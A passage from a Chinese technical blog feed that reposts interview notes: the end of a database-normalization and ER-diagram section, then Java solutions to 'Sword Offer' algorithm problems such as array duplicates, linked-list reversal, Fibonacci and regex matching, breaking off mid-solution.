可以通过分解来满足。 分解前 Sno Sname Sdept Mname Cname Grade 1 学生-1 学院-1 院长-1 课程-1 90 2 学生-2 学院-2 院长-2 课程-2 80 2 学生-2 学院-2 院长-2 课程-1 100 3 学生-3 学院-2 院长-2 课程-2 95 以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖： Sno -&gt; Sname, Sdept Sdept -&gt; Mname Sno, Cname-&gt; Grade Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。 Sname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。 分解后 关系-1 Sno Sname Sdept Mname 1 学生-1 学院-1 院长-1 2 学生-2 学院-2 院长-2 3 学生-3 学院-2 院长-2 有以下函数依赖： Sno -&gt; Sname, Sdept, Mname Sdept -&gt; Mname 关系-2 Sno Cname Grade 1 课程-1 90 2 课程-2 80 2 课程-1 100 3 课程-2 95 有以下函数依赖： Sno, Cname -&gt; Grade 3. 第三范式 (3NF)非主属性不传递函数依赖于键码。 上面的 关系-1 中存在以下传递函数依赖：Sno -&gt; Sdept -&gt; Mname，可以进行以下分解： 关系-11 Sno Sname Sdept 1 学生-1 学院-1 2 学生-2 学院-2 3 学生-3 学院-2 关系-12 Sdept Mname 学院-1 院长-1 学院-2 院长-2 八、ER 图Entity-Relationship，有三个组成部分：实体、属性、联系。 用来进行关系型数据库系统的概念设计。 实体的三种联系包含一对一，一对多，多对多三种。 如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B；如果是一对一，画两个带箭头的线段；如果是多对多，画两个不带箭头的线段。下图的 Course 和 Student 是一对多的关系。 表示出现多次的关系一个实体在联系出现几次，就要用几条线连接。下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。 联系的多向性虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。 一般只使用二元联系，可以把多元关系转换为二元关系。 表示子类用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。 参考资料 AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006. 施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013. 史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006. The InnoDB Storage Engine Transaction isolation levels Concurrency Control The Nightmare of Locking, Blocking and Isolation Levels! Database Normalization and Normal Forms with an Example The basics of the InnoDB undo logging and history system MySQL locking for the busy web developer 浅入浅出 MySQL 和 InnoDB Innodb 中的事务隔离级别和锁的关系]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[剑指 offer 题解]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[2. 实现 Singleton 3. 数组中重复的数字 4. 二维数组中的查找 5. 替换空格 6. 从尾到头打印链表 7. 重建二叉树 8. 二叉树的下一个结点 9. 用两个栈实现队列 10.1 斐波那契数列 10.2 跳台阶 10.3 变态跳台阶 10.4 矩形覆盖 11. 旋转数组的最小数字 12. 矩阵中的路径 13. 机器人的运动范围 14. 剪绳子 15. 二进制中 1 的个数 16. 数值的整数次方 17. 打印从 1 到最大的 n 位数 18.1 在 O(1) 时间内删除链表节点 18.2 删除链表中重复的结点 19. 正则表达式匹配 20. 表示数值的字符串 21. 调整数组顺序使奇数位于偶数前面 22. 链表中倒数第 K 个结点 23. 链表中环的入口结点 24. 反转链表 25. 合并两个排序的链表 26. 树的子结构 27. 二叉树的镜像 28 对称的二叉树 29. 顺时针打印矩阵 30. 包含 min 函数的栈 31. 栈的压入、弹出序列 32.1 从上往下打印二叉树 32.2 把二叉树打印成多行 32.3 按之字形顺序打印二叉树 33. 二叉搜索树的后序遍历序列 34. 二叉树中和为某一值的路径 35. 复杂链表的复制 36. 二叉搜索树与双向链表 37. 序列化二叉树 38. 字符串的排列 39. 数组中出现次数超过一半的数字 40. 最小的 K 个数 41.1 数据流中的中位数 41.2 字符流中第一个不重复的字符 42. 连续子数组的最大和 43. 从 1 到 n 整数中 1 出现的次数 44. 数字序列中的某一位数字 45. 把数组排成最小的数 46. 把数字翻译成字符串 47. 礼物的最大价值 48. 最长不含重复字符的子字符串 49. 丑数 50. 第一个只出现一次的字符位置 51. 数组中的逆序对 52. 两个链表的第一个公共结点 53 数字在排序数组中出现的次数 54. 二叉搜索树的第 K 个结点 55.1 二叉树的深度 55.2 平衡二叉树 56. 数组中只出现一次的数字 57.1 和为 S 的两个数字 57.2 和为 S 的连续正数序列 58.1 翻转单词顺序列 58.2 左旋转字符串 59. 滑动窗口的最大值 60. n 个骰子的点数 61. 扑克牌顺子 62. 圆圈中最后剩下的数 63. 股票的最大利润 64. 求 1+2+3+…+n 65. 不用加减乘除做加法 66. 构建乘积数组 67. 把字符串转换成整数 68. 树中两个节点的最低公共祖先 参考文献 2. 实现 Singleton单例模式 3. 数组中重复的数字NowCoder 题目描述在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。例如，如果输入长度为 7 的数组 {2, 3, 1, 0, 2, 5}，那么对应的输出是第一个重复的数字 2。 要求复杂度为 O(N) + O(1)，也就是时间复杂度 O(N)，空间复杂度 O(1)。因此不能使用排序的方法，也不能使用额外的标记数组。牛客网讨论区这一题的首票答案使用 nums[i] + length 来将元素标记，这么做会有加法溢出问题。 解题思路这种数组元素在 [0, n-1] 范围内的问题，可以将值为 i 的元素放到第 i 个位置上。 以 (2, 3, 1, 0, 2, 5) 为例： 12345678position-0 : (2,3,1,0,2,5) // 2 &lt;-&gt; 1 (1,3,2,0,2,5) // 1 &lt;-&gt; 3 (3,1,2,0,2,5) // 3 &lt;-&gt; 0 (0,1,2,3,2,5) // already in positionposition-1 : (0,1,2,3,2,5) // already in positionposition-2 : (0,1,2,3,2,5) // already in positionposition-3 : (0,1,2,3,2,5) // already in positionposition-4 : (0,1,2,3,2,5) // nums[i] == nums[nums[i]], exit 遍历到位置 4 时，该位置上的数为 2，但是第 2 个位置上已经有一个 2 的值了，因此可以知道 2 重复。 123456789101112131415161718public boolean duplicate(int[] nums, int length, int[] duplication) &#123; if (nums == null || length &lt;= 0) return false; for (int i = 0; i &lt; length; i++) &#123; while (nums[i] != i) &#123; if (nums[i] == nums[nums[i]]) &#123; duplication[0] = nums[i]; return true; &#125; swap(nums, i, nums[i]); &#125; &#125; return false;&#125;private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; 4. 二维数组中的查找NowCoder 题目描述在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 1234567891011Consider the following matrix:[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]]Given target = 5, return true.Given target = 20, return false. 解题思路从右上角开始查找。因为矩阵中的一个数，它左边的数都比它小，下边的数都比它大。因此，从右上角开始查找，就可以根据 target 和当前元素的大小关系来缩小查找区间。 复杂度：O(M + N) + O(1) 123456789101112131415public boolean Find(int target, int[][] matrix) &#123; if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int rows = matrix.length, cols = matrix[0].length; int r = 0, c = cols - 1; // 从右上角开始 while (r &lt;= rows - 1 &amp;&amp; c &gt;= 0) &#123; if (target == matrix[r][c]) return true; else if (target &gt; matrix[r][c]) r++; else c--; &#125; return false;&#125; 5. 替换空格NowCoder 题目描述请实现一个函数，将一个字符串中的空格替换成“%20”。例如，当字符串为 We Are Happy. 则经过替换之后的字符串为 We%20Are%20Happy。 解题思路在字符串尾部填充任意字符，使得字符串的长度等于字符串替换之后的长度。因为一个空格要替换成三个字符（%20），因此当遍历到一个空格时，需要在尾部填充两个任意字符。 令 P1 指向字符串原来的末尾位置，P2 指向字符串现在的末尾位置。P1 和 P2从后向前遍历，当 P1 遍历到一个空格时，就需要令 P2 指向的位置依次填充 02%（注意是逆序的），否则就填充上 P1 指向字符的值。 从后向前遍是为了在改变 P2 所指向的内容时，不会影响到 P1 遍历原来字符串的内容。 复杂度：O(N) + O(1) 12345678910111213141516171819public String replaceSpace(StringBuffer str) &#123; int oldLen = str.length(); for (int i = 0; i &lt; oldLen; i++) if (str.charAt(i) == ' ') str.append(" "); int P1 = oldLen - 1, P2 = str.length() - 1; while (P1 &gt;= 0 &amp;&amp; P2 &gt; P1) &#123; char c = str.charAt(P1--); if (c == ' ') &#123; str.setCharAt(P2--, '0'); str.setCharAt(P2--, '2'); str.setCharAt(P2--, '%'); &#125; else &#123; str.setCharAt(P2--, c); &#125; &#125; return str.toString();&#125; 6. 从尾到头打印链表NowCoder 题目描述输入链表的第一个节点，从尾到头反过来打印出每个结点的值。 解题思路使用栈1234567891011public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (listNode != null) &#123; stack.add(listNode.val); listNode = listNode.next; &#125; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); while (!stack.isEmpty()) ret.add(stack.pop()); return ret;&#125; 使用递归12345678public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (listNode != null) &#123; ret.addAll(printListFromTailToHead(listNode.next)); ret.add(listNode.val); &#125; return ret;&#125; 使用 Collections.reverse()123456789public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); while (listNode != null) &#123; ret.add(listNode.val); listNode = listNode.next; &#125; Collections.reverse(ret); return ret;&#125; 使用头插法利用链表头插法为逆序的特点。 头结点和第一个节点的区别：头结点是在头插法中使用的一个额外节点，这个节点不存储值；第一个节点就是链表的第一个真正存储值的节点。 123456789101112131415161718public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; // 头插法构建逆序链表 ListNode head = new ListNode(-1); while (listNode != null) &#123; ListNode memo = listNode.next; listNode.next = head.next; head.next = listNode; listNode = memo; &#125; // 构建 ArrayList ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); head = head.next; while (head != null) &#123; ret.add(head.val); head = head.next; &#125; return ret;&#125; 7. 重建二叉树NowCoder 题目描述根据二叉树的前序遍历和中序遍历的结果，重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。 12preorder = [3,9,20,15,7]inorder = [9,3,15,20,7] 解题思路前序遍历的第一个值为根节点的值，使用这个值将中序遍历结果分成两部分，左部分为树的左子树中序遍历结果，右部分为树的右子树中序遍历的结果。 123456789101112131415161718private Map&lt;Integer, Integer&gt; inOrderNumsIndexs = new HashMap&lt;&gt;(); // 缓存中序遍历数组的每个值对应的索引public TreeNode reConstructBinaryTree(int[] pre, int[] in) &#123; for (int i = 0; i &lt; in.length; i++) inOrderNumsIndexs.put(in[i], i); return reConstructBinaryTree(pre, 0, pre.length - 1, in, 0, in.length - 1);&#125;private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int[] in, int inL, int inR) &#123; if (preL &gt; preR) return null; TreeNode root = new TreeNode(pre[preL]); int inIndex = inOrderNumsIndexs.get(root.val); int leftTreeSize = inIndex - inL; root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, in, inL, inL + leftTreeSize - 1); root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, in, inL + leftTreeSize + 1, inR); return root;&#125; 8. 二叉树的下一个结点NowCoder 题目描述给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。 解题思路① 如果一个节点的右子树不为空，那么该节点的下一个节点是右子树的最左节点； ② 否则，向上找第一个左链接指向的树包含该节点的祖先节点。 12345678910public class TreeLinkNode &#123; int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null; TreeLinkNode(int val) &#123; this.val = val; &#125;&#125; 12345678910111213141516public TreeLinkNode GetNext(TreeLinkNode pNode) &#123; if (pNode.right != null) &#123; TreeLinkNode node = pNode.right; while (node.left != null) node = node.left; return node; &#125; else &#123; while (pNode.next != null) &#123; TreeLinkNode parent = pNode.next; if (parent.left == pNode) return parent; pNode = pNode.next; &#125; &#125; return null;&#125; 9. 用两个栈实现队列NowCoder 题目描述用两个栈来实现一个队列，完成队列的 Push 和 Pop 操作。队列中的元素为 int 类型。 解题思路in 栈用来处理入栈（push）操作，out 栈用来处理出栈（pop）操作。一个元素进入 in 栈之后，出栈的顺序被反转。当元素要出栈时，需要先进入 out 栈，此时元素出栈顺序再一次被反转，因此出栈顺序就和最开始入栈顺序是相同的，先进入的元素先退出，这就是队列的顺序。 1234567891011121314151617Stack&lt;Integer&gt; in = new Stack&lt;Integer&gt;();Stack&lt;Integer&gt; out = new Stack&lt;Integer&gt;();public void push(int node) &#123; in.push(node);&#125;public int pop() throws Exception &#123; if (out.isEmpty()) while (!in.isEmpty()) out.push(in.pop()); if (out.isEmpty()) throw new Exception("queue is empty"); return out.pop();&#125; 10.1 斐波那契数列NowCoder 题目描述求菲波那契数列的第 n 项，n &lt;= 39。 解题思路如果使用递归求解，会重复计算一些子问题。例如，计算 f(10) 需要计算 f(9) 和 f(8)，计算 f(9) 需要计算 f(8) 和 f(7)，可以看到 f(8) 被重复计算了。 递归方法是将一个问题划分成多个子问题求解，动态规划也是如此，但是动态规划会把子问题的解缓存起来，避免重复求解子问题。 123456789public int Fibonacci(int n) &#123; if (n &lt;= 1) return n; int[] fib = new int[n + 1]; fib[1] = 1; for (int i = 2; i &lt;= n; i++) fib[i] = fib[i - 1] + fib[i - 2]; return fib[n];&#125; 考虑到第 i 项只与第 i-1 和第 i-2 项有关，因此只需要存储前两项的值就能求解第 i 项，从而将空间复杂度由 O(N) 降低为 O(1)。 123456789101112public int Fibonacci(int n) &#123; if (n &lt;= 1) return n; int pre2 = 0, pre1 = 1; int fib = 0; for (int i = 2; i &lt;= n; i++) &#123; fib = pre2 + pre1; pre2 = pre1; pre1 = fib; &#125; return fib;&#125; 由于待求解的 n 小于 40，因此可以将前 40 项的结果先进行计算，之后就能以 O(1) 时间复杂度得到第 n 项的值了。 1234567891011121314public class Solution &#123; private int[] fib = new int[40]; public Solution() &#123; fib[1] = 1; fib[2] = 2; for (int i = 2; i &lt; fib.length; i++) fib[i] = fib[i - 1] + fib[i - 2]; &#125; public int Fibonacci(int n) &#123; return fib[n]; &#125;&#125; 10.2 跳台阶NowCoder 题目描述一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。 解题思路复杂度：O(N) + O(N) 12345678910public int JumpFloor(int n) &#123; if (n == 1) return 1; int[] dp = new int[n]; dp[0] = 1; dp[1] = 2; for (int i = 2; i &lt; n; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[n - 1];&#125; 复杂度：O(N) + O(1) 123456789101112public int JumpFloor(int n) &#123; if (n &lt;= 1) return n; int pre2 = 0, pre1 = 1; int result = 0; for (int i = 1; i &lt;= n; i++) &#123; result = pre2 + pre1; pre2 = pre1; pre1 = result; &#125; return result;&#125; 10.3 变态跳台阶NowCoder 题目描述一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级… 它也可以跳上 n 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。 解题思路12345678public int JumpFloorII(int target) &#123; int[] dp = new int[target]; Arrays.fill(dp, 1); for (int i = 1; i &lt; target; i++) for (int j = 0; j &lt; i; j++) dp[i] += dp[j]; return dp[target - 1];&#125; 10.4 矩形覆盖NowCoder 题目描述我们可以用 2*1 的小矩形横着或者竖着去覆盖更大的矩形。请问用 n 个 2*1 的小矩形无重叠地覆盖一个 2*n 的大矩形，总共有多少种方法？ 解题思路复杂度：O(N) + O(N) 12345678910public int RectCover(int n) &#123; if (n &lt;= 2) return n; int[] dp = new int[n]; dp[0] = 1; dp[1] = 2; for (int i = 2; i &lt; n; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[n - 1];&#125; 复杂度：O(N) + O(1) 123456789101112public int RectCover(int n) &#123; if (n &lt;= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 3; i &lt;= n; i++) &#123; result = pre2 + pre1; pre2 = pre1; pre1 = result; &#125; return result;&#125; 11. 旋转数组的最小数字NowCoder 题目描述把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。例如数组 {3, 4, 5, 1, 2} 为 {1, 2, 3, 4, 5} 的一个旋转，该数组的最小值为 1。NOTE：给出的所有元素都大于 0，若数组大小为 0，请返回 0。 解题思路当 nums[m] &lt;= nums[h] 的情况下，说明解在 [l, m] 之间，此时令 h = m；否则解在 [m + 1, h] 之间，令 l = m + 1。 因为 h 的赋值表达式为 h = m，因此循环体的循环条件应该为 l &lt; h，详细解释请见 Leetcode 题解。 复杂度：O(logN) + O(1) 12345678910111213public int minNumberInRotateArray(int[] nums) &#123; if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &lt;= nums[h]) h = m; else l = m + 1; &#125; return nums[l];&#125; 12. 矩阵中的路径NowCoder 题目描述请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如下面的矩阵包含了一条 bfce 路径。 解题思路1234567891011121314151617181920212223242526272829303132333435363738private final static int[][] next = &#123;&#123;0, -1&#125;, &#123;0, 1&#125;, &#123;-1, 0&#125;, &#123;1, 0&#125;&#125;;private int rows;private int cols;public boolean hasPath(char[] array, int rows, int cols, char[] str) &#123; if (rows == 0 || cols == 0) return false; this.rows = rows; this.cols = cols; boolean[][] marked = new boolean[rows][cols]; char[][] matrix = buildMatrix(array); for (int i = 0; i &lt; rows; i++) for (int j = 0; j &lt; cols; j++) if (backtracking(matrix, str, marked, 0, i, j)) return true; return false;&#125;private boolean backtracking(char[][] matrix, char[] str, boolean[][] marked, int pathLen, int r, int c) &#123; if (pathLen == str.length) return true; if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols || matrix[r][c] != str[pathLen] || marked[r][c]) return false; marked[r][c] = true; for (int[] n : next) if (backtracking(matrix, str, marked, pathLen + 1, r + n[0], c + n[1])) return true; marked[r][c] = false; return false;&#125;private char[][] buildMatrix(char[] array) &#123; char[][] matrix = new char[rows][cols]; for (int i = 0, idx = 0; i &lt; rows; i++) for (int j = 0; j &lt; cols; j++) matrix[i][j] = array[idx++]; return matrix;&#125; 13. 机器人的运动范围NowCoder 题目描述地上有一个 m 行和 n 列的方格。一个机器人从坐标 (0, 0) 的格子开始移动，每一次只能向左右上下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于 k 的格子。例如，当 k 为 18 时，机器人能够进入方格（35, 37），因为 3+5+3+7=18。但是，它不能进入方格（35, 38），因为 3+5+3+8=19。请问该机器人能够达到多少个格子？ 解题思路123456789101112131415161718192021222324252627282930313233343536373839404142private static final int[][] next = &#123;&#123;0, -1&#125;, &#123;0, 1&#125;, &#123;-1, 0&#125;, &#123;1, 0&#125;&#125;;private int cnt = 0;private int rows;private int cols;private int threshold;private int[][] digitSum;public int movingCount(int threshold, int rows, int cols) &#123; this.rows = rows; this.cols = cols; this.threshold = threshold; initDigitSum(); boolean[][] marked = new boolean[rows][cols]; dfs(marked, 0, 0); return cnt;&#125;private void dfs(boolean[][] marked, int r, int c) &#123; if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols || marked[r][c]) return; marked[r][c] = true; if (this.digitSum[r][c] &gt; this.threshold) return; cnt++; for (int[] n : next) dfs(marked, r + n[0], c + n[1]);&#125;private void initDigitSum() &#123; int[] digitSumOne = new int[Math.max(rows, cols)]; for (int i = 0; i &lt; digitSumOne.length; i++) &#123; int n = i; while (n &gt; 0) &#123; digitSumOne[i] += n % 10; n /= 10; &#125; &#125; digitSum = new int[rows][cols]; for (int i = 0; i &lt; this.rows; i++) for (int j = 0; j &lt; this.cols; j++) digitSum[i][j] = digitSumOne[i] + digitSumOne[j];&#125; 14. 剪绳子Leetcode 题目描述把一根绳子剪成多段，并且使得每段的长度乘积最大。 For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). 解题思路动态规划解法12345678public int integerBreak(int n) &#123; int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i &lt;= n; i++) for (int j = 1; j &lt; i; j++) dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j))); return dp[n];&#125; 贪心解法尽可能多剪长度为 3 的绳子，并且不允许有长度为 1 的绳子出现，如果出现了，就从已经切好长度为 3 的绳子中拿出一段与长度为 1 的绳子重新组合，把它们切成两段长度为 2 的绳子。 证明：当 n &gt;= 5 时，3(n - 3) - 2(n - 2) = n - 5 &gt;= 0。因此把长度大于 5 的绳子切成两段，令其中一段长度为 3 可以使得两段的乘积最大。 12345678910111213public int integerBreak(int n) &#123; if (n &lt; 2) return 0; if (n == 2) return 1; if (n == 3) return 2; int timesOf3 = n / 3; if (n - timesOf3 * 3 == 1) timesOf3--; int timesOf2 = (n - timesOf3 * 3) / 2; return (int) (Math.pow(3, timesOf3)) * (int) (Math.pow(2, timesOf2));&#125; 15. 二进制中 1 的个数NowCoder 题目描述输入一个整数，输出该数二进制表示中 1 的个数。 Integer.bitCount()123public int NumberOf1(int n) &#123; return Integer.bitCount(n);&#125; n&amp;(n-1)O(logM) 时间复杂度解法，其中 M 表示 1 的个数。 该位运算是去除 n 的位级表示中最低的那一位。 123n : 10110100n-1 : 10110011n&amp;(n-1) : 10110000 12345678public int NumberOf1(int n) &#123; int cnt = 0; while (n != 0) &#123; cnt++; n &amp;= (n - 1); &#125; return cnt;&#125; 16. 数值的整数次方NowCoder 题目描述给定一个 double 类型的浮点数 base 和 int 类型的整数 exponent。求 base 的 exponent 次方。 解题思路下面的讨论中 x 代表 base，n 代表 exponent。 因为 (x*x)n/2 可以通过递归求解，并且每递归一次，n 都减小一半，因此整个算法的时间复杂度为 O(logN)。 123456789101112131415public double Power(double base, int exponent) &#123; if (exponent == 0) return 1; if (exponent == 1) return base; boolean isNegative = false; if (exponent &lt; 0) &#123; exponent = -exponent; isNegative = true; &#125; double pow = Power(base * base, exponent / 2); if (exponent % 2 != 0) pow = pow * base; return isNegative ? 1 / pow : pow;&#125; 17. 打印从 1 到最大的 n 位数题目描述输入数字 n，按顺序打印出从 1 最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数即 999。 解题思路由于 n 可能会非常大，因此不能直接用 int 表示数字，而是用 char 数组进行存储。 使用回溯法得到所有的数。 1234567891011121314151617181920212223242526public void print1ToMaxOfNDigits(int n) &#123; if (n &lt;= 0) return; char[] number = new char[n]; print1ToMaxOfNDigits(number, -1);&#125;private void print1ToMaxOfNDigits(char[] number, int digit) &#123; if (digit == number.length - 1) &#123; printNumber(number); return; &#125; for (int i = 0; i &lt; 10; i++) &#123; number[digit + 1] = (char) (i + '0'); print1ToMaxOfNDigits(number, digit + 1); &#125;&#125;private void printNumber(char[] number) &#123; int index = 0; while (index &lt; number.length &amp;&amp; number[index] == '0') index++; while (index &lt; number.length) System.out.print(number[index++]); System.out.println();&#125; 18.1 在 O(1) 时间内删除链表节点解题思路① 如果该节点不是尾节点，那么可以直接将下一个节点的值赋给该节点，然后令该节点指向下下个节点，再删除下一个节点，时间复杂度为 O(1)。 ② 否则，就需要先遍历链表，找到节点的前一个节点，然后让前一个节点指向 null，时间复杂度为 O(N)。 综上，如果进行 N 次操作，那么大约需要操作节点的次数为 N-1+N=2N-1，其中 N-1 表示 N-1 个不是尾节点的每个节点以 O(1) 的时间复杂度操作节点的总次数，N 表示 1 个尾节点以 O(N) 的时间复杂度操作节点的总次数。(2N-1)/N ~ 2，因此该算法的平均时间复杂度为 O(1)。 12345678910111213141516public ListNode deleteNode(ListNode head, ListNode tobeDelete) &#123; if (head == null || head.next == null || tobeDelete == null) return null; if (tobeDelete.next != null) &#123; // 要删除的节点不是尾节点 ListNode next = tobeDelete.next; tobeDelete.val = next.val; tobeDelete.next = next.next; &#125; else &#123; ListNode cur = head; while (cur.next != tobeDelete) cur = cur.next; cur.next = null; &#125; return head;&#125; 18.2 删除链表中重复的结点NowCoder 题目描述 解题描述12345678910111213public ListNode deleteDuplication(ListNode pHead) &#123; if (pHead == null || pHead.next == null) return pHead; ListNode next = pHead.next; if (pHead.val == next.val) &#123; while (next != null &amp;&amp; pHead.val == next.val) next = next.next; return deleteDuplication(next); &#125; else &#123; pHead.next = deleteDuplication(pHead.next); return pHead; &#125;&#125; 19. 正则表达式匹配NowCoder 题目描述请实现一个函数用来匹配包括 ‘.’ 和 ‘*‘ 的正则表达式。模式中的字符 ‘.’ 表示任意一个字符，而 ‘*‘ 表示它前面的字符可以出现任意次（包含 0 次）。在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串 “aaa” 与模式 “a.a” 和 “ab*ac*a” 匹配，但是与 “aa.a” 和 “ab*a” 均不匹配。 解题思路应该注意到，’.’ 是用来当做一个任意字符，而 ‘*‘ 是用来重复前面的字符。这两个的作用不同，不能把 ‘.’ 的作用和 ‘*‘ 进行类比，从而把它当成重复前面字符一次。 123456789if p.charAt(j) == s.charAt(i) : then dp[i][j] = dp[i-1][j-1];if p.charAt(j) == '.' : then dp[i][j] = dp[i-1][j-1];if p.charAt(j) == '*' : if p.charAt(j-1) != s.charAt(i) : then dp[i][j] = dp[i][j-2] // a* only counts as empty if p.charAt(j-1) == s.charAt(i) or p.charAt(i-1) == '.' : then dp[i][j] = dp[i-1][j] // a* counts as multiple a or dp[i][j] = dp[i][j-1] // a* counts as single a or dp[i][j] = dp[i][j-2] // a* counts as empty 12345678910111213141516171819public boolean match(char[] str, char[] pattern) &#123; int m = str.length, n = pattern.length; boolean[][] dp = new boolean[m + 1][n + 1]; dp[0][0] = true; for (int i = 1; i &lt;= n; i++) if (pattern[i - 1] == '*') dp[0][i] = dp[0][i - 2]; for (int i = 1; i &lt;= m; i++) for (int j = 1; j &lt;= n; j++) if (str[i - 1] == pattern[j - 1] || pattern[j - 1] == '.') dp[i][j] = dp[i - 1][j - 1]; else if (pattern[j - 1] == '*') if (pattern[j - 2] == str[i - 1] || pattern[j - 2] == '.') dp[i][j] = dp[i][j - 1] || dp[i][j - 2] || dp[i - 1][j]; else dp[i][j] = dp[i][j - 2]; return dp[m][n];&#125; 20. 表示数值的字符串NowCoder 题目描述请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串 “+100”,”5e2”,”-123”,”3.1416” 和 “-1E-16” 都表示数值。 但是 “12e”,”1a3.14”,”1.2.3”,”+-5” 和 “12e+4.3” 都不是。 解题思路12345public boolean isNumeric(char[] str) &#123; if (str == null) return false; return new String(str).matches("[+-]?\\d*(\\.\\d+)?([eE][+-]?\\d+)?");&#125; 21. 调整数组顺序使奇数位于偶数前面NowCoder 题目描述保证奇数和奇数，偶数和偶数之间的相对位置不变，这和书本不太一样。 解题思路123456789101112131415public void reOrderArray(int[] nums) &#123; // 奇数个数 int oddCnt = 0; for (int val : nums) if (val % 2 == 1) oddCnt++; int[] copy = nums.clone(); int i = 0, j = oddCnt; for (int num : copy) &#123; if (num % 2 == 1) nums[i++] = num; else nums[j++] = num; &#125;&#125; 22. 链表中倒数第 K 个结点NowCoder 解题思路设链表的长度为 N。设两个指针 P1 和 P2，先让 P1 移动 K 个节点，则还有 N - K 个节点可以移动。此时让 P1 和 P2 同时移动，可以知道当 P1 移动到链表结尾时，P2 移动到 N - K 个节点处，该位置就是倒数第 K 个节点。 12345678910111213141516public ListNode FindKthToTail(ListNode head, int k)&#123; if (head == null) return null; ListNode P1 = head; while (P1 != null &amp;&amp; k-- &gt; 0) P1 = P1.next; if (k &gt; 0) return null; ListNode P2 = head; while (P1 != null) &#123; P1 = P1.next; P2 = P2.next; &#125; return P2;&#125; 23. 链表中环的入口结点NowCoder 题目描述一个链表中包含环，请找出该链表的环的入口结点。 要求不能使用额外的空间。 解题思路使用双指针，一个指针 fast 每次移动两个节点，一个指针 slow 每次移动一个节点。因为存在环，所以两个指针必定相遇在环中的某个节点上。假设相遇点在下图的 z1 位置，此时 fast 移动的节点数为 x+2y+z，slow 为 x+y，由于 fast 速度比 slow 快一倍，因此 x+2y+z=2(x+y)，得到 x=z。 在相遇点，slow 要到环的入口点还需要移动 z 个节点，如果让 fast 重新从头开始移动，并且速度变为每次移动一个节点，那么它到环入口点还需要移动 x 个节点。在上面已经推导出 x=z，因此 fast 和 slow 将在环入口点相遇。 12345678910111213141516public ListNode EntryNodeOfLoop(ListNode pHead)&#123; if (pHead == null || pHead.next == null) return null; ListNode slow = pHead, fast = pHead; do &#123; fast = fast.next.next; slow = slow.next; &#125; while (slow != fast); fast = pHead; while (slow != fast) &#123; slow = slow.next; fast 